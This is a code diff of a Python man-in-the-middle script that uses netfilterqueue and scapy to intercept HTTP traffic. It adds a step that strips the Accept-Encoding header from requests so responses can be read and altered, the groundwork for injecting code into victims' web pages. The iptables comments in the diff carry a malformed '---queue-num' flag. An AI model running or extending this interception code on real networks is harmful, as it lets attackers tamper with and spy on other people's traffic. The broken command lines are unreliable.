@@ -2,9 +2,10 @@
 
 import netfilterqueue
 import scapy.all as scapy
+import re
 
-# iptables -I INPUT -j NFQUEUE --queue-num 0
-# iptables -I OUTPUT -j 
+# iptables -I INPUT -j NFQUEUE ---queue-num 0
+# iptables -I OUTPUT -j NFQUEUE ---queue-num 0
 
 ack_list = []
 
@@ -20,10 +21,12 @@ def process_packet(packet):
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
             print("[+] Request")
-            print(packet.show())
+            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
             print("[+] Response")
-            print(packet.show())
+            #print(packet.show())
 
     packet.accept()
 
